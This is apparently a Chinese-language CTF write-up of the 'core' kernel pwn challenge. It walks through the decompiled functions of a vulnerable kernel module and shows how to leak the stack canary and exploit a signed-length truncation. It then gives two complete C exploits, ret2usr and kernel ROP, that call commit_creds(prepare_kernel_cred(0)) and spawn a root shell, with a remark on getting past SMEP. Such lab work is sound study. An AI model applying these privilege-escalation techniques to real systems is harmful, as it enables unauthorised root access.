---
layout: post
title: 2018 kernel pwn core
excerpt: "kernel pwn"
categories: [Writeup]
comments: true
---
一篇kernelrop的完整流程 https://github.com/vnik5287/kernel_rop

启动脚本
```
#! /bin/sh

qemu-system-x86_64 \
	-m 256M \
	-kernel ./bzImage \
	-initrd  ./core.cpio \
	-append "root=/dev/ram rw oops=panic panic=1 console=ttyS0 quiet kaslr useradd" \
	-gdb tcp::1234 \
	-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
	-nographic  \
```
程序开启了kaslr

解压文件系统
```
cpio -idmv < core.cpio
```
允许普通用户读取内核函数地址,需要在init中添加
```
echo 0 > /proc/sys/kernel/kptr_restrict
echo 1 >/proc/sys/kernel/perf_event_paranoid
```
然后再创建镜像文件
```
find . | cpio -o --format=newc > ../core.cpio
```
查看下保护
```c
root@snappyjack-VirtualBox:/home/2018rop# checksec core.ko
[*] '/home/2018rop/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```
发现开启了Canary

core_ioctl函数
```
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v3; // rbx@1

  v3 = a3;
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);                            // 将栈地址拷贝到我们指定的用户空间,这里存在一个内存泄露
      break;
    case 0x6677889C:
      printk(&unk_2CD);                         // 打印地址
      off = v3;                                 // off可以由我们指定
      break;
    case 0x6677889A:
      printk(&unk_2B3);                         // 打印地址
      core_copy_func(v3);
      break;
  }
  return 0LL;
}
```

查看core_copy_func函数
```
signed __int64 __fastcall core_copy_func(signed __int64 a1)
{
  signed __int64 result; // rax@2
  __int64 v2; // rdx@4
  __int64 v3; // [sp+0h] [bp-50h]@2
  __int64 v4; // [sp+40h] [bp-10h]@1

  v4 = *MK_FP(__GS__, 40LL);
  printk(&unk_215);
  if ( a1 > 63 )		//a1输入一个负数,绕过这个if语句
  {
    printk(&unk_2A1);
    result = 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(&v3, &name, (unsigned __int16)a1);		//这里看到a1的类型发生了转变,(0xf000000000000000|0x100)这样的数造成了截断,产生一个栈溢出
  }
  v2 = *MK_FP(__GS__, 40LL) ^ v4;
  return result;
}
```
发现a1的类型发生了转变,当我们输入如0xf000000000000000|0x100这样的数据就可以绕过限制,就可以造成内核的栈溢出了

再看core_read函数
```c
int __fastcall core_read(__int64 a1)
{
  __int64 v1; // rbx@1
  __int64 *v2; // rdi@1
  signed __int64 i; // rcx@1
  __int64 v4; // rax@4
  __int64 v6; // [sp+0h] [bp-50h]@1
  __int64 v7; // [sp+40h] [bp-10h]@1

  v1 = a1;
  v7 = *MK_FP(__GS__, 40LL);
  printk(&unk_25B);					//打印两个地址的值
  printk(&unk_275);
  v2 = &v6;
  for ( i = 16LL; i; --i )			//这一块好像没什么用
  {
    *(_DWORD *)v2 = 0;
    v2 = (__int64 *)((char *)v2 + 4);
  }
  strcpy((char *)&v6, "Welcome to the QWB CTF challenge.\n");
  LODWORD(v4) = copy_to_user(v1, (char *)&v6 + off, 0x40LL);// v1和off由我们指定,所以这里存在一个leak
  if ( v4 )
    __asm { swapgs }
  else
    v4 = *MK_FP(__GS__, 40LL) ^ v7;
  return v4;
}
```
可以泄露出Canary

core_write函数如下,这个函数可以向name地址中写入数据
```
signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx@1
  signed __int64 result; // rax@2
  __int64 v5; // rax@3

  v3 = a3;
  printk(&unk_215);
  if ( v3 > 0x800 || (LODWORD(v5) = copy_from_user(&name, a2, v3), v5) )	//可以向name(.bss)中写入数据
  {
    printk(&unk_230);
    result = 0xFFFFFFF2LL;
  }
  else
  {
    result = (unsigned int)v3;
  }
  return result;
}
```

#### 利用思路
- 设置全局变量off的大小，然后通过core_read()leak出canary
- 通过core_write()向全局变量name中写入我们构造的ROPchain
- 通过设置合理的长度利用core_copy_func()函数把name的ROPchain向v2变量上写,进行ROP攻击
- ROP调用commit_creds(prepare_kernel_cred(0))，然后swapgs，iretq到用户态;
- 用户态起shell，get root;
#### 调试小技巧
为了方便调试,我们修改一下init文件:
```
setsid /bin/cttyhack setuidgid 0 /bin/sh
```
查看模块基地址
```
/ # lsmod | grep core
core 16384 0 - Live 0xffffffffc0098000 (O)
```
添加symbol
```
add-symbol-file ./core.ko 0xfc031d000
```
在vmlinux中查看函数地址偏移,其中内核的默认基地址是0xffffffff81000000
```
from pwn import *
elf = ELF('./core/vmlinux')
print "commit_creds",hex(elf.symbols['commit_creds']-0xffffffff81000000)
print "prepare_kernel_cred",hex(elf.symbols['prepare_kernel_cred']-0xffffffff81000000)
```
运行后看到我们的偏移
```
commit_creds 0x9c8e0
prepare_kernel_cred 0x9cce0
```
在qemu中查看实际地址
```
/ # more /proc/kallsyms | grep commit_creds
ffffffffa2a9c8e0 T commit_creds
/ # more /proc/kallsyms | grep prepare_kernel_cred
ffffffffa2a9cce0 T prepare_kernel_cred
```
相减得到vmlinux基地址`0xffffffffa2a00000`

使用ropper进行gadget查找
```
ropper --file vmlinux --nocolor > result.txt
```
或者
```
ROPgadget --binary vmlinux > 1.txt
```
### 利用
提权函数
```
commit_creds(prepare_kernel_cred(0));
```
在虚拟机中查看地址
```
                       / # cat /proc/kallsyms | grep commit_creds
                       faa89c8e0 T commit_creds
                       / # cat /proc/kallsyms | grep prepare_kernel_cred
                       faa89cce0 T prepare_kernel_cred
```
最终exp
```
//kernel 4.15.8
//ret2usr.c
//gcc ret2usr.c -o ret2usr -w -static
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
int fd;
unsigned long user_cs, user_ss, user_eflags,user_sp;
size_t commit_creds_addr,prepare_kernel_cred_addr;
 
void core_read(char *buf){              //函数封装
    ioctl(fd,0x6677889B,buf);
    //printf("[*]The buf is:%x\n",buf);
}

void change_off(long long v1){          //函数封装
    ioctl(fd,0x6677889c,v1);
}

void core_write(char *buf,int a3){      //函数封装
    write(fd,buf,a3);
}

void core_copy_func(long long size){    //函数封装
    ioctl(fd,0x6677889a,size);
}

void shell(){                           //起一个shell
    system("/bin/sh");
}

void save_stats(){                      //保存用户状态
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}

void get_root(){                                    //这里就是从用户态运行了提权
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}

int main(){
    int ret,i;
    char buf[0x100];
    size_t vmlinux_base,core_base,canary;
    size_t commit_creds_offset = 0x9c8e0;               //通过vmlinx可以找到
    size_t prepare_kernel_cred_offset = 0x9cce0;        //通过vmlinx可以找到
    size_t rop[0x100];
    save_stats();
    fd = open("/proc/core",O_RDWR);
    change_off(0x40);
    core_read(buf);
    /*
    for(i=0;i<0x40;i++){
    printf("[*] The buf[%x] is:%p\n",i,*(size_t *)(&buf[i]));
    }
    */
    vmlinux_base = *(size_t *)(&buf[0x20]) - 0x1dd6d1;      //通过leak计算出基地址
    core_base = *(size_t *)(&buf[0x10]) - 0x19b;            //通过leak计算出基地址
    canary = *(size_t *)(&buf[0]);
    printf("[*]canary:%p\n",canary);
    printf("[*]vmlinux_base:%p\n",vmlinux_base);
    printf("[*]core_base:%p\n",core_base);
    for(i = 0;i < 8;i++){
        rop[i] = 0x66666666;                //填充
    }
    rop[i++] = canary;                      //canary
    rop[i++] = 0x0;                         //junk
    rop[i++] = (size_t)get_root;            //跳到用户的位置执行了提权
    rop[i++] = core_base + 0xd6;            //swapgs; pop rbp; ret
    rop[i++] = 0;                           //junk
    rop[i++] = vmlinux_base + 0x50ac2;      //iretq; ret;
    rop[i++] = (size_t)shell;               //起一个shell
    rop[i++] = user_cs;
    rop[i++] = user_eflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    core_write(rop,0x100);
    core_copy_func(0xf000000000000100);
    return 0;
}

```
或者
```
//rop.c
//gcc rop.c -o poc -w -static
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
int fd;
void core_read(char *buf){                      //函数封装
    ioctl(fd,0x6677889B,buf);
    //printf("[*]The buf is:%x\n",buf);
}

void change_off(long long v1){                  //函数封装
    ioctl(fd,0x6677889c,v1);
}

void core_write(char *buf,int a3){              //函数封装
    write(fd,buf,a3);
}

void core_copy_func(long long size){            //函数封装
    ioctl(fd,0x6677889a,size);
}

void shell(){                                   //起一个shell
    system("/bin/sh");
}

unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats(){                              //保存用户状态
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

int main(){
    int ret,i;
    char buf[0x100];
    size_t vmlinux_base,core_base,canary;
    size_t commit_creds_addr,prepare_kernel_cred_addr;
    size_t commit_creds_offset = 0x9c8e0;           //通过vmlinux找出
    size_t prepare_kernel_cred_offset = 0x9cce0;    //通过vmlinux找出
    size_t rop[0x100];
    save_stats();
    fd = open("/proc/core",O_RDWR);
    change_off(0x40);
    core_read(buf);
    /*
    for(i=0;i<0x40;i++){
    printf("[*] The buf[%x] is:%p\n",i,*(size_t *)(&buf[i]));
    }
    */
    vmlinux_base = *(size_t *)(&buf[0x20]) - 0x1dd6d1;      //通过leak计算出基地址
    core_base = *(size_t *)(&buf[0x10]) - 0x19b;            //通过leak计算出基地址
    prepare_kernel_cred_addr = vmlinux_base + prepare_kernel_cred_offset;
    commit_creds_addr = vmlinux_base + commit_creds_offset;
    canary = *(size_t *)(&buf[0]);
    printf("[*]canary:%p\n",canary);
    printf("[*]vmlinux_base:%p\n",vmlinux_base);
    printf("[*]core_base:%p\n",core_base);
    printf("[*]prepare_kernel_cred_addr:%p\n",prepare_kernel_cred_addr);
    printf("[*]commit_creds_addr:%p\n",commit_creds_addr);
    //junk
    for(i = 0;i < 8;i++){
        rop[i] = 0x66666666;
    }
    rop[i++] = canary;                      //canary
    rop[i++] = 0;                           //rbp(junk)
    rop[i++] = vmlinux_base + 0xb2f;        //pop_rdi_ret;
    rop[i++] = 0;                           //rdi
    rop[i++] = prepare_kernel_cred_addr;     //在内核空间运行了prepare_kernel_cred(0)
    rop[i++] = vmlinux_base + 0xa0f49;      //pop_rdx_ret
    rop[i++] = vmlinux_base + 0x21e53;      //pop_rcx_ret       此时rdx的值是这个
    rop[i++] = vmlinux_base + 0x1aa6a;      //mov rdi, rax ; call rdx      这时上一个函数结果到了rdi,然后call rdx
    rop[i++] = commit_creds_addr;
    rop[i++] = core_base + 0xd6;            //swapgs; pop rbp; ret
    rop[i++] = 0;                           //rbp(junk)
    rop[i++] = vmlinux_base + 0x50ac2;      //iretp_ret
    rop[i++] = (size_t)shell;               //起一个shell
    rop[i++] = user_cs;
    rop[i++] = user_eflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
    core_write(rop,0x100);
    core_copy_func(0xf000000000000100);
    return 0;
}
```
### 关于kernel栈溢出的smep与smap
这里的栈溢出都是溢出在内核空间,构造rop这边不会存在smap的问题,smep的绕过就是内核空间查找`mov cr4, 0x1407e0`gadget,关闭smep,或者在内核空间找gadget,代码段全部来自内核